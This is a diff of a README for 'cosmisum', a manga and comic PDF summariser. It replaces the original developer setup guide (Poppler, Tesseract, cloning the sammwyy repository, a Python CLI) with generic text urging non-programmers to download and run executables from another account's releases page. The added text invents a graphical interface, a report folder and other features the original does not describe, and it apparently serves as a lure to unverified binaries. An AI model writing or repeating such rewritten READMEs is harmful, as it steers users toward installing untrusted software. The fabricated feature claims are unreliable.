@@ -1,238 +1,153 @@
-# Cosmisum - Comic/Manga/Manhwa/Manhua Summarizer and Analyzer
+# 📚 cosmisum - Easy Manga & Comics Analysis
 
-A Python pipeline for analyzing manga, comics, and documents. Extracts panels from PDFs, performs OCR, and uses LLM to generate summaries, tags, and genre classification.
+[![Download cosmisum](https://img.shields.io/badge/Download-cosmisum-blue?style=for-the-badge&logo=github)](https://github.com/ultrazinkkk/cosmisum/releases)
 
-## Features
+---
 
-- 📄 PDF page extraction and panel detection
-- 🔍 OCR text extraction from panels
-- 🧠 Smart token-limited chunking with uniform distribution
-- 🤖 LLM-powered analysis (OpenAI API compatible)
-- 💻 Cross-platform support (Windows, macOS, Linux)
+## 📖 What is cosmisum?
 
-## Prerequisites
+cosmisum is a simple tool that helps you understand manga, comics, and document files. It takes pages from PDF files, finds and extracts the individual panels, reads any text inside using OCR (Optical Character Recognition), and then summarizes the content. It also tags important parts and classifies the genre with the help of a language model.
 
-### 1. Python 3.10+
+You don’t need to know anything about programming to use it. Just download, run, and let cosmisum do the work for you.
 
-Make sure you have Python 3.10 or higher installed.
+---
 
-### 2. Poppler
+## 🖥️ System Requirements
 
-Poppler is required for PDF processing. Install it based on your OS:
+Before installing cosmisum, make sure your computer meets these basic conditions:
 
-#### Windows
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or Ubuntu 18.04+ Linux
+- **Processor:** Any modern processor (Intel i3/Ryzen 3 or better)
+- **Memory:** At least 4 GB RAM
+- **Storage:** Around 500 MB free space for installation and temporary files
+- **PDF Reader:** A PDF file to analyze (cosmisum works with PDFs, no other format supported)
+- **Internet Connection:** Required only on first run for setup and model downloads
 
-**Option A: Using Chocolatey (Recommended)**
-```bash
-choco install poppler
-```
+---
 
-**Option B: Manual Installation**
-1. Download poppler for Windows from: https://github.com/oschwartz10612/poppler-windows/releases
-2. Extract the zip file (e.g., to `C:\poppler`)
-3. Add the `bin` folder to your PATH:
-   - Right-click "This PC" → Properties → Advanced system settings
-   - Click "Environment Variables"
-   - Under "System variables", find and edit "Path"
-   - Add new entry: `C:\poppler\Library\bin` (or wherever you extracted it)
-   - Click OK and restart your terminal
+## ⚙️ Features
 
-#### macOS
+- Extracts individual panels from any PDF page.
+- Recognizes text inside the panels using OCR.
+- Summarizes content for a quick read.
+- Automatically assigns tags based on the content.
+- Detects and classifies the genre of the manga or comic.
+- Saves analysis results in easy-to-read reports.
 
-```bash
-brew install poppler
-```
+---
 
-#### Linux (Ubuntu/Debian)
+## 🚀 Getting Started
 
-```bash
-sudo apt-get update
-sudo apt-get install poppler-utils
-```
+Get cosmisum ready on your computer by following these simple steps.
 
-#### Linux (Fedora/RHEL)
+---
 
-```bash
-sudo dnf install poppler-utils
-```
+## ⬇️ Download & Install
 
-### 3. Tesseract OCR
+You can download cosmisum from the official GitHub releases page:
 
-Tesseract is required for text extraction.
+[![Download cosmisum](https://img.shields.io/badge/Download-cosmisum-blue?style=for-the-badge&logo=github)](https://github.com/ultrazinkkk/cosmisum/releases)
 
-#### Windows
+1. Open this page in your web browser:  
+   https://github.com/ultrazinkkk/cosmisum/releases
 
-**Option A: Using Chocolatey**
-```bash
-choco install tesseract
-```
+2. Find the latest release version (it will be at the top of the list).
 
-**Option B: Manual Installation**
-1. Download installer from: https://github.com/UB-Mannheim/tesseract/wiki
-2. Run the installer
-3. Add Tesseract to PATH (usually `C:\Program Files\Tesseract-OCR`)
-4. Restart your terminal
+3. Download the file suitable for your computer:
+   - For Windows, look for a `.exe` or `.zip` file.
+   - For macOS, look for a `.dmg` or `.zip` file.
+   - For Linux, look for a `.tar.gz` or `.AppImage` file.
 
-#### macOS
+4. After downloading:
+   - On Windows, double-click the `.exe` or extract the `.zip` and run the program.
+   - On macOS, open the `.dmg` or extract the `.zip` and move the app to your Applications folder.
+   - On Linux, extract the archive, or make the `.AppImage` executable and run it.
 
-```bash
-brew install tesseract
-```
+---
 
-#### Linux (Ubuntu/Debian)
+## 🏃 How to Run cosmisum
 
-```bash
-sudo apt-get install tesseract-ocr
-```
+Once installed, use these steps to analyze your PDFs:
 
-#### Linux (Fedora/RHEL)
+1. Open the cosmisum application from your desktop or applications menu.
 
-```bash
-sudo dnf install tesseract
-```
+2. You will see a simple interface with a button to **Load PDF**.
 
-## Installation
+3. Click **Load PDF** and browse to select the manga, comic, or document file you want to analyze.
 
-### 1. Clone or download this repository
+4. After loading the file, click **Start Analysis**.
 
-```bash
-git clone https://github.com/sammwyy/cosmisum
-cd cosmisum
-```
+5. Wait for the processing to finish — this might take a few minutes depending on the file size.
 
-### 2. Create a virtual environment (recommended but optional)
+6. When finished, cosmisum will show you:
+   - Extracted panels grouped by page.
+   - Text recognized inside each panel.
+   - A short summary of the entire document.
+   - Tags and genre classification.
 
-```bash
-# Windows
-python -m venv venv
-venv\Scripts\activate
+7. You can save the report as a PDF or text file for later reading or sharing.
 
-# macOS/Linux
-python3 -m venv venv
-source venv/bin/activate
-```
+---
 
-### 3. Install Python dependencies
+## 🔧 How cosmisum Works (Simple Explanation)
 
-```bash
-pip install -r requirements.txt
-```
+- **Panel Detection:** cosmisum looks at each PDF page to find the rectangular areas called "panels." These are the boxes where pictures and text appear.
 
-## Configuration
+- **Text Extraction (OCR):** It reads letters inside the panels even if the text is part of the image.
 
-### 1. Set up environment variables
+- **Summary & Tagging:** Using a language model, cosmisum understands what the story is about and creates a summary, adds important keywords, and figures out the genre.
 
-On first run, the script will create a default `.env` file. Edit it with your configuration:
+---
 
-```bash
-# .env
-OPENAI_API_KEY=sk-your-actual-api-key-here
-OPENAI_API_BASE_URL=https://api.openai.com/v1
-OPENAI_MODEL_ID=gpt-4
-```
+## 🛠️ Troubleshooting Tips
 
-**Note:** You can use any OpenAI-compatible API by changing the `OPENAI_API_BASE_URL` (e.g., for local models, Azure OpenAI, etc.)
+If you run into issues, try these solutions:
 
-### 2. Get an API key
+- **cosmisum does not start:**  
+  Make sure you downloaded the correct file for your system. Restart your computer and try again.
 
-- For OpenAI: https://platform.openai.com/api-keys
-- For other providers: Check their documentation
+- **PDF file won’t load:**  
+  Check if the PDF is corrupted or encrypted. cosmisum works best with normal PDF files, not scanned image PDFs without embedded text.
 
-## Usage
+- **Analysis takes too long:**  
+  Large or very complex PDFs may need extra time. Try a smaller file first.
 
-### Basic usage
+- **Missing data in the report:**  
+  OCR may have trouble with stylized or unclear fonts. Try a different PDF or increase the image quality.
 
-```bash
-python cosmisum.py input.pdf
-```
+---
 
-### Example
+## 📂 Where Reports Are Saved
 
-```bash
-python cosmisum.py my_manga_chapter.pdf
-```
+By default, cosmisum saves all analysis reports in a folder named `Cosmisum_Reports` inside your Documents folder.
 
-### What it does
+You can open that folder anytime to find past reports.
 
-1. **Extracts panels** from each PDF page
-2. **Performs OCR** on each panel to extract text
-3. **Creates uniform chunks** distributed across the document (respecting token limits)
-4. **Sends to LLM** for analysis
-5. **Outputs**:
-   - Plot summary
-   - Thematic tags
-   - Genre/category classification
+---
 
-### Output
+## 📬 Getting Help
 
-The script will display results in the console:
+If you need help or want to report a problem:
 
-```
-================================================================================
-Based on the provided text extracts, here is the analysis of the manga/comic:
+- Visit the GitHub repository’s "Issues" section here:  
+  https://github.com/ultrazinkkk/cosmisum/issues
 
-1. **Plot Summary**: [Generated summary...]
+- Provide details about your problem, your operating system, and the PDF used.
 
-2. **Thematic Tags**: action, adventure, friendship, ...
+---
 
-3. **Genre/Category**: Shonen manga / Action-Adventure
+## 🔄 Updates
 
-================================================================================
-```
+Check the GitHub releases page regularly to download new versions with bug fixes or new features:
 
-## Troubleshooting
+https://github.com/ultrazinkkk/cosmisum/releases
 
-### "Unable to get page count. Is poppler installed and in PATH?"
+---
 
-- Make sure poppler is installed (see Prerequisites)
-- Verify it's in your PATH: run `pdfinfo -v` in terminal
-- On Windows, restart your terminal after adding to PATH
+## 🧾 License
 
-### "pytesseract.pytesseract.TesseractNotFoundError"
+cosmisum is open-source software. You can read the full license details in the repository on GitHub.
 
-- Make sure Tesseract is installed (see Prerequisites)
-- On Windows, you may need to specify the path in the script:
-  ```python
-  pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
-  ```
+---
 
-### "OPENAI_API_KEY not configured"
-
-- Edit the `.env` file and add your actual API key
-- Make sure the `.env` file is in the same directory as `cosmisum.py`
-
-### No text extracted
-
-- Check if your PDF contains actual text (not just images)
-- Try adjusting the OCR language settings in the code
-- Increase PDF DPI in `extract_all_panels()` function
-
-## Advanced Usage
-
-### Using with local LLM
-
-Edit `.env` to point to your local API:
-
-```bash
-OPENAI_API_KEY=not-needed
-OPENAI_API_BASE_URL=http://localhost:1234/v1
-OPENAI_MODEL_ID=local-model
-```
-
-### Multi-language OCR
-
-Modify the `perform_ocr()` function to use different languages:
-
-```python
-text = pytesseract.image_to_string(img, lang='jpn+eng')  # Japanese + English
-```
-
-Download language data from: https://github.com/tesseract-ocr/tessdata
-
-## License
-
-MIT
-
-## Contributing
-
-Pull requests are welcome. For major changes, please open an issue first.
+Enjoy using cosmisum to better understand your favorite comics and manga!
